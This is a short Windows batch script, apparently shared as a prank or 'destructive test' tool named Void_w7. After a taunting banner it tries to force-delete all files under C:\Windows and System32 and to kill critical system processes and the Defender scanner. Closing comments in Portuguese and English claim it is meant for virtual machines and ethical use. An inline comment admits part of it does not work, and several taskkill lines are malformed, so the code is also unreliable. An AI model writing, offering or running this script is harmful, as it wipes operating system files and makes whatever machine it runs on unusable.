echo off
color 0b
title Void_w7 by cve222
cls
echo.
echo.
echo.
echo        Look at your archives, they are coming into the void.
echo.
echo.
echo.
echo s | del -f -s -q C:\Windows\*.*
echo s | del -f -s -q C:\Windows\System32\*.* #nao ta funcionando desisto
taskkill /f /pid System
taskkill /f /pid smss.exe
taskkill /f /pid csrss.exe
taskkill /f /pid wininit.exe
taskkill /f /pid winlogon.exe
taskkill /f /pid services.exe
taskkill /f /pid lsass.exe
taskkill /f /pid lsm.exe
taskkill /f /pid dwm.exe
taskkill /f /pid explorer.exe
taskkill /f /pid svchost.exe
taskkill /f /pid spoolsv.exe
taskkill /f /pid SearchIndexer.exe
taskkill /f /pid taskhost.exe
taskkill /f /pid wmpnetwk.exe 
taskkill /f /pid MpCmdRun.exe
exit

REM fiz para me divertir e testar em ambiente controlado (VM - Virtual Machines)
REM utilize o script de maneira responsável e ética
REM não baixe o arquivo sem entender o que está fazendo, agradeço
REM dica: ele é inofensivo se você executar sem as permissões de admin

REM i did to have fun and test in virtual machines
REM take care when you use this, use with responsabitilie and ethic
REM don't download the archive if you don't know what you doing
REM tip: he dont bite if  you execute without admin permissions
